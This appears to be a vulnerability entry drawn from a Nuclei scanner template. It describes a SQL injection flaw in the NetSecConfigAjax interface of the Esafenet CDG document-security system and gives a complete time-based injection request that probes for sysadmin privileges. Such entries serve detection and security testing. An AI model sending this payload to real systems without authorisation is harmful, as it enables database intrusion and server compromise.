# Vulnerability: Esafenet CDG NetSecConfigAjax - Sql Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`esafenet-netsecconfigajax-sqli.yaml`)

## Description
The `state` parameter of the `NetSecConfigAjax` interface of the Yisaitong electronic document security management system does not pre-compile and adequately verify the incoming data, resulting in a SQL injection vulnerability in the interface. Malicious attackers may obtain the server through this vulnerability information or directly obtain server permissions.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /CDGServer3/NetSecConfigAjax;Service HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--
```

